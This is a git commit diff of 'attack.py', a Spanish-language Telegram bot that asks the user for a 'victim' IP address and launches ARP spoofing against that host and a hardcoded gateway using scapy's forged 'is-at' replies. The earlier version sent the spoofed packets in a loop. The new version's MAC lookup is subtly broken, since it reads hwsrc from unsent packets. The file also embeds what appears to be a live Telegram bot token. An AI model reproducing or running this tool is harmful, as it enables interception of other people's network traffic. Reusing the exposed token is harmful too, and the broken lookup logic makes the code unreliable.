49a2059e028c6de62c4a6651cf38b086119a10e9
Izan Cano González <116309678+Sxmpl3@users.noreply.github.com>
2023-03-09 01:28:43 -0800

    Update attack.py

--- attack.py
+++ attack.py
@@ -1,13 +1,16 @@
 import logging
 import os
-import threading
-import time
 
 from telegram import ReplyKeyboardMarkup
 from telegram.ext import CommandHandler, ConversationHandler, MessageHandler, Updater
-from scapy.all import ARP, Ether, send, srp
+from scapy.all import ARP, Ether, send
 
-IP, MAC = range(2)
+a = 1
+
+ipg = '192.168.75.1'
+
+IP, GATEWAY = range(2)
+
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)
@@ -15,66 +18,74 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 
 def start(update, context):
+    """Comando /start"""
 
-    update.message.reply_text('Hola, usa /help para ver los comandos disponibles')
+    update.message.reply_text('Hola pringao, usa /help para ver los comandos disponibles')
 
 
 def help(update, context):
+    """Comando /help"""
 
-    update.message.reply_text('Los comandos disponibles son los siguientes:')
-    update.message.reply_text('')
-    update.message.reply_text('/start')
-    update.message.reply_text('/help')
-    update.message.reply_text('/attack')
+    update.message.reply_text('Use el comando /attack para realizar el ataque')
 
 def attack(update, context):
 
     reply_keyboard = [['/cancel']]
-    update.message.reply_text(
-        '¿Cuál es la dirección IP de su víctima?',
+    
+    ip = update.message.reply_text(
+        '¿Cuál es la dirección IP de su víctima? (Escriba "/cancel" para cancelar la petición)',
         reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
     )
 
     return IP
 
 def set_ip(update, context):
+  
+    ip = update.message.text.strip()
 
-    ip = update.message.text
+    logger.info(f'ARP spoofing iniciado para {ip}')
 
-    gateway_ip = "192.168.75.1"
-    gateway_mac = "00:50:56:C0:00:08"
-    
-    target_ip = update.message.text
-    target_mac = "00:0C:29:A0:F7:39"
-    
-    print(target_ip)
-    print(target_mac)
+    target_ip = ip
+    gateway_ip = ipg
 
-    arp = ARP(pdst=target_ip)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether/arp
-    result = srp(packet, timeout=3, verbose=0)[0]
+    try:
+        arp = ARP(pdst=target_ip)
+        target_mac = arp.hwsrc
+        gateway_mac = ARP(pdst=gateway_ip).hwsrc
 
-    for sent, received in result:
-        target_mac = received.hwsrc
+        packet_target = Ether(dst=target_mac)/ARP(op="is-at", hwsrc=gateway_mac, psrc=gateway_ip, pdst=target_ip)
+        packet_gateway = Ether(dst=gateway_mac)/ARP(op="is-at", hwsrc=target_mac, psrc=target_ip, pdst=gateway_ip)
 
-    while True:
-      
-        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
+        send(packet_target, verbose=False)
+        send(packet_gateway, verbose=False)
 
-        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
+        logger.info(f'ARP spoofing finalizado para {ip}')
+        update.message.reply_text(f'Se realizó ARP spoofing a la dirección IP {ip}')
 
-        time.sleep(2)
+    except Exception as e:
+        logger.error(f'Ocurrió un error al realizar el ARP spoofing: {str(e)}')
+        update.message.reply_text('Ocurrió un error al realizar el ARP spoofing')
 
     return ConversationHandler.END
 
 def cancel(update, context):
-  
+
     update.message.reply_text('Operación cancelada')
 
     return ConversationHandler.END
+
+conv_handler = ConversationHandler(
+    entry_points=[CommandHandler('attack', attack)],
   
+    states={
+        IP: [MessageHandler(None, set_ip)]
+    },
+  
+    fallbacks=[MessageHandler(None, cancel)]
+)
+
 def main():
+    """Se inicia el bot"""
 
     updater = Updater("6140799429:AAH3UwOcl4GlqqIy0oRKrTjbEfUAWWCicgU", use_context=True)
 
@@ -82,20 +93,14 @@ def main():
 
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("help", help))
-    conv_handler = ConversationHandler(
-        entry_points=[CommandHandler('attack', attack)],
-        states={
-            IP: [MessageHandler(None, IP)],
-        },
-        fallbacks=[CommandHandler('cancel', cancel)],
-        allow_reentry=True
-    )
     dp.add_handler(conv_handler)
     updater.start_polling()
 
+    logger.info("El bot se ha iniciado correctamente")
     updater.idle()
 
 if __name__ == '__main__':
     main()
     
 # By Sxmpl3.
+
